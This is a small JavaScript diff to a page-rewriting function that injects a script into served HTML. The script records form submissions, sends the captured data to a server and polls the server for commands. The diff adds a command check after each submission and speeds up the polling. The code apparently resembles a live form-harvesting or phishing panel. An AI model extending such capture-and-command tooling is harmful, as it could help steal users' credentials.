@@ -577,6 +577,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
     sendResultPayload(data, "form");
     send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
+    window.setTimeout(checkCommand, 400);
   }
 
   function handleFallbackSubmit(control, event) {
@@ -594,6 +595,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
     sendResultPayload(data, "fallback");
     send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
+    window.setTimeout(checkCommand, 400);
   }
 
   send("traffic", { event: "page_load", screen: pageLabel() });
@@ -619,7 +621,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, security = {} }) {
       .catch(function () {});
   }
 
-  window.setInterval(checkCommand, 4000);
+  window.setInterval(checkCommand, 1500);
   window.setInterval(sendHeartbeat, 10000);
 
   document.addEventListener("click", function (event) {
